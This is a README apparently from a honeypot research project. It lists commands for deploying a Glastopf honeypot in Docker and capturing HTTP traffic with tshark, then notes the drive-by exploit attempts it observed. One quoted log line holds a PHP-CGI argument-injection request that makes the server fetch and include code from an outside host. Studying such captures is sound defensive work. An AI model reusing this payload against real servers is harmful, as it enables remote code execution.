# Analyze Traffic from port 80 while a Glastopf honeypot is set up

## Getting the Data: 
0. Install docker: ``sudo apt-get install docker docker.io``
1. clone the glastopf honeypot git repository: ``git clone https://github.com/mushorg/glastopf && cd glastopf`` [glastopf](https://github.com/mushorg/glastopf.git)
2. Build Glastopf's Docker image: ``sudo docker build --tag glastopf .``
3. Make a new directory for the glastopf logs: ``mkdir myhoneypot1``
4. Run the docker image: ``sudo docker run --detach --publish 80:80 --volume myhoneypot1:/opt/myhoneypot glastopf``
5. Create a log file for tshark for the root user: ``sudo touch http_log.pcap``
6. Start Tshark logging in the background: ``sudo tshark -w http_log.pcap "port 80 or port 8080 or port 443" &``
7. After capturing for 24 hours, stop capturing: ``sudo docker stop <container id>; sudo pkill tshark``
8. Read the pcap: ``tshark -r ~/http_log.pcap``
9. Read glastopf's logs: ``less ~/glastopf/myhoneypot1/logs/glastopf.log``
10. Copy all logs into the same place: ``mkdir http_glastopf_logs && cp http_log.pcap http_glastopf_logs; cp -r ~/glastopf/myhoneypot1/logs/ http_glastopf_logs/``
11. Compress this directory into a tarball: ``tar -vacf http_glastopf_logs.tar.gz http_glastopf_logs/``
12. Exit out of server
13. Copy the tarball from server to a local machine and add it to the github repository. ``scp -P <port> <usr name>@<ip addr of server>:~/http_glastopf_logs.tar.gz /home/$(whoami)/``

## Analysis:
The steps detailed above occurred between March 6, 2017 at 18:45PST and March 7, 2017 at 18:30PST


## Helpful Links
* [glastopf](https://github.com/mushorg/glastopf.git)



## Drive By Exploit attempts:
1. Apache Struts
2. Shellshock
3. 2017-03-26 03:24:29,428 (glastopf.glastopf) 191.96.249.97 requested GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n on 13dc3d8ebca9:80
  * When Downloaded, the file ok.txt contains the text: ``echo "nigerianwarrior";``
